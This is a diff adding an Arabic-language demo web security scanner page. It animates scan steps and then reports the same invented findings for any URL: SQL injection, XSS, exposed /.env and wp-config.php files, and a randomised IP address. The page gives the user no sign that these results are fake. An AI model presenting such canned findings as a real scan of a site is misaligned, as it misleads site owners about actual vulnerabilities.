+      <div class="card card-high"><div class="card-num" id="cHigh">0</div><div class="card-lbl">HIGH</div></div>
+      <div class="card card-medium"><div class="card-num" id="cMed">0</div><div class="card-lbl">MEDIUM</div></div>
+      <div class="card card-low"><div class="card-num" id="cLow">0</div><div class="card-lbl">LOW</div></div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">◈ SCAN INFO</div>
+      <div id="infoList"></div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">◈ VULNERABILITIES</div>
+      <div id="vulnList"></div>
+    </div>
+
+    <div class="dl-wrap">
+      <button class="dl-btn" onclick="downloadReport()">⬇ تحميل التقرير TXT</button>
+    </div>
+  </div>
+
+</main>
+
+<footer>WEB SECURITY SCANNER — FOR AUTHORIZED USE ONLY — © 2025</footer>
+
+<script>
+// =====================
+// بيانات الفحص الوهمية (Demo)
+// =====================
+// ملاحظة: هذا demo يعمل في المتصفح مباشرة
+// للفحص الحقيقي شغّل app.py على جهازك
+
+const DEMO_VULNS = {
+  ssl: {
+    missing: { type:'Missing HTTPS', severity:'high', description:'الموقع لا يستخدم HTTPS — البيانات تنتقل بدون تشفير', recommendation:'استخدم شهادة SSL وحوّل كل الطلبات من HTTP إلى HTTPS' },
+    expiring: { type:'SSL Certificate Expiring', severity:'medium', description:'شهادة SSL ستنتهي خلال 15 يوم', recommendation:'جدد شهادة SSL قبل انتهائها' }
+  },
+  headers: [
+    { type:'Missing Header: X-Frame-Options', severity:'medium', description:'الموقع عرضة لهجمات Clickjacking', recommendation:'أضف: X-Frame-Options: DENY' },
+    { type:'Missing Header: Strict-Transport-Security', severity:'high', description:'لا يوجد HSTS — يمكن تحويل الاتصال لـ HTTP', recommendation:'أضف: Strict-Transport-Security: max-age=31536000' },
+    { type:'Missing Header: Content-Security-Policy', severity:'high', description:'لا يوجد CSP — الموقع عرضة لهجمات XSS المتقدمة', recommendation:'أضف Content-Security-Policy مناسب لموقعك' },
+    { type:'Server Version Disclosure', severity:'low', description:'الـ Server يكشف إصداره: Apache/2.4.51', recommendation:'أخفِ معلومات الـ Server من الهيدرز' }
+  ],
+  sql: { type:'SQL Injection', severity:'high', description:'تم اكتشاف ثغرة SQL Injection في نموذج تسجيل الدخول', recommendation:'استخدم Prepared Statements وتحقق من كل المدخلات' },
+  xss: { type:'XSS — Cross Site Scripting', severity:'high', description:'تم اكتشاف ثغرة XSS في حقل البحث', recommendation:'شفّر كل المدخلات قبل عرضها وفعّل CSP' },
+  files: [
+    { type:'Sensitive File Exposed', severity:'high', description:'ملف حساس مكشوف: /.env', recommendation:'احذف أو احمِ الوصول لملفات البيئة' },
+    { type:'Sensitive File Exposed', severity:'high', description:'ملف حساس مكشوف: /wp-config.php', recommendation:'انقل ملف الإعدادات خارج مجلد الويب' }
+  ],
+  dns: { type:'Missing SPF Record', severity:'medium', description:'لا يوجد SPF Record — الموقع عرضة لانتحال البريد', recommendation:'أضف SPF Record في إعدادات DNS' }
+};
+
+let scanReport = null;
+let stepTimer = null;
+
+async function startScan() {
+  const url = document.getElementById('urlInput').value.trim();
+  if (!url) { showError('الرجاء إدخال رابط الموقع'); return; }
+
+  document.getElementById('resultsBox').style.display = 'none';
+  document.getElementById('errorBox').style.display = 'none';
+  document.getElementById('loadingBox').style.display = 'block';
+  document.getElementById('scanBtn').disabled = true;
+  document.getElementById('scanBtn').textContent = '⏳ جاري الفحص...';
+
+  resetSteps();
+  await animateSteps();
+  await runDemoScan(url);
+
+  document.getElementById('loadingBox').style.display = 'none';
+  document.getElementById('scanBtn').disabled = false;
+  document.getElementById('scanBtn').textContent = '▶ ابدأ الفحص';
+}
+
+function resetSteps() {
+  for (let i = 1; i <= 6; i++) {
+    const el = document.getElementById('s'+i);
+    el.className = 'step';
+  }
+}
+
+async function animateSteps() {
+  const stepNames = ['SSL/TLS','SEC HEADERS','SQL INJECTION','XSS','SENSITIVE FILES','DNS'];
+  for (let i = 1; i <= 6; i++) {
+    document.getElementById('s'+i).className = 'step active';
+    document.getElementById('scanningLabel').textContent = 'SCANNING ' + stepNames[i-1] + '...';
+    await sleep(900);
+    document.getElementById('s'+i).className = 'step done';
+    document.getElementById('s'+i).textContent = '✓ ' + stepNames[i-1];
+  }
+  document.getElementById('scanningLabel').textContent = 'SCAN COMPLETE';
+}
+
+async function runDemoScan(url) {
+  const now = new Date().toLocaleString('ar-EG');
+  const isHttp = url.startsWith('http://');
+  const domain = url.replace(/https?:\/\//,'').split('/')[0];
+
+  const vulns = [];
+  const info = [
+    { title:'Target URL', value: url },
+    { title:'Domain', value: domain },
+    { title:'Scan Date', value: now },
+    { title:'IP Address', value: '104.21.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) },
+    { title:'Server', value: 'Apache/2.4.51 (Unix)' },
+    { title:'SSL Certificate', value: isHttp ? 'غير متوفر' : 'ينتهي بعد 15 يوم' }
+  ];
+
+  if (isHttp) vulns.push({...DEMO_VULNS.ssl.missing, timestamp: now});
+  else vulns.push({...DEMO_VULNS.ssl.expiring, timestamp: now});
+
+  DEMO_VULNS.headers.forEach(h => vulns.push({...h, timestamp: now}));
+  vulns.push({...DEMO_VULNS.sql, timestamp: now});
+  vulns.push({...DEMO_VULNS.xss, timestamp: now});
+  DEMO_VULNS.files.forEach(f => vulns.push({...f, timestamp: now}));
+  vulns.push({...DEMO_VULNS.dns, timestamp: now});
+
+  const summary = {
+    total: vulns.length,
+    high: vulns.filter(v=>v.severity==='high').length,
+    medium: vulns.filter(v=>v.severity==='medium').length,
+    low: vulns.filter(v=>v.severity==='low').length
+  };
+
+  scanReport = { url, domain, date: now, vulns, info, summary };
+  showResults(scanReport);
+}
+
+function showResults(r) {
+  document.getElementById('cTotal').textContent = r.summary.total;
+  document.getElementById('cHigh').textContent  = r.summary.high;
+  document.getElementById('cMed').textContent   = r.summary.medium;
+  document.getElementById('cLow').textContent   = r.summary.low;
+
+  const infoList = document.getElementById('infoList');
+  infoList.innerHTML = '';
+  r.info.forEach(item => {
+    infoList.innerHTML += `
+      <div class="info-item">
+        <span class="info-key">${item.title}</span>
+        <span class="info-val">${item.value}</span>
+      </div>`;
+  });
+
+  const vulnList = document.getElementById('vulnList');
+  vulnList.innerHTML = '';
+
+  if (!r.vulns.length) {
+    vulnList.innerHTML = '<div class="no-vulns">✓ لم يتم اكتشاف ثغرات</div>';
+  } else {
+    const order = {high:0, medium:1, low:2};
+    const sorted = [...r.vulns].sort((a,b)=>order[a.severity]-order[b.severity]);
+    const sevLabel = {high:'HIGH ●', medium:'MEDIUM ●', low:'LOW ●'};
+    sorted.forEach((v,i) => {
+      vulnList.innerHTML += `
+        <div class="vuln-card vuln-${v.severity}">
+          <div class="vuln-head">
+            <span class="vuln-head-title">#${i+1} ${v.type}</span>
+            <span class="badge">${sevLabel[v.severity]}</span>
+          </div>
+          <div class="vuln-body">
+            <div class="vuln-row"><span class="vuln-lbl">DESCRIPTION</span><span class="vuln-val">${v.description}</span></div>
+            <div class="vuln-row"><span class="vuln-lbl">FIX</span><span class="vuln-val">${v.recommendation}</span></div>
+            <div class="vuln-row"><span class="vuln-lbl">TIME</span><span class="vuln-val" style="font-family:var(--mono);font-size:11px;">${v.timestamp}</span></div>
+          </div>
+        </div>`;
+    });
+  }
+
+  document.getElementById('resultsBox').style.display = 'block';
+  document.getElementById('resultsBox').scrollIntoView({behavior:'smooth'});
+}
+
+function downloadReport() {
+  if (!scanReport) return;
+  const r = scanReport;
+  let txt = `=================================================\n`;
+  txt += `  WEB SECURITY SCANNER — SCAN REPORT\n`;
+  txt += `=================================================\n\n`;
+  txt += `TARGET : ${r.url}\n`;
+  txt += `DOMAIN : ${r.domain}\n`;
+  txt += `DATE   : ${r.date}\n\n`;
+  txt += `-------------------------------------------------\n`;
+  txt += `SUMMARY\n`;
+  txt += `-------------------------------------------------\n`;
+  txt += `Total Vulnerabilities : ${r.summary.total}\n`;
+  txt += `High                  : ${r.summary.high}\n`;
+  txt += `Medium                : ${r.summary.medium}\n`;
+  txt += `Low                   : ${r.summary.low}\n\n`;
+  txt += `-------------------------------------------------\n`;
+  txt += `SYSTEM INFO\n`;
+  txt += `-------------------------------------------------\n`;
+  r.info.forEach(i => { txt += `${i.title.padEnd(20)}: ${i.value}\n`; });
+  txt += `\n-------------------------------------------------\n`;
+  txt += `VULNERABILITIES FOUND\n`;
+  txt += `-------------------------------------------------\n\n`;
+  const order = {high:0,medium:1,low:2};
+  const sorted = [...r.vulns].sort((a,b)=>order[a.severity]-order[b.severity]);
+  sorted.forEach((v,i) => {
+    txt += `[${v.severity.toUpperCase()}] #${i+1} ${v.type}\n`;
+    txt += `Description   : ${v.description}\n`;
+    txt += `Recommendation: ${v.recommendation}\n`;
+    txt += `Time          : ${v.timestamp}\n\n`;
+  });
+  txt += `=================================================\n`;
+  txt += `Generated by Web Security Scanner v1.0\n`;
+  txt += `FOR AUTHORIZED USE ONLY\n`;
+  txt += `=================================================\n`;
+
+  const blob = new Blob([txt], {type:'text/plain;charset=utf-8'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `scan_report_${r.domain}_${Date.now()}.txt`;
+  a.click();
+}
+
+function showError(msg) {
+  const el = document.getElementById('errorBox');
+  el.textContent = '✗ ' + msg;
+  el.style.display = 'block';
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+document.getElementById('urlInput').addEventListener('keypress', e => {
+  if (e.key === 'Enter') startScan();
+});
+</script>
+</body>
+</html>
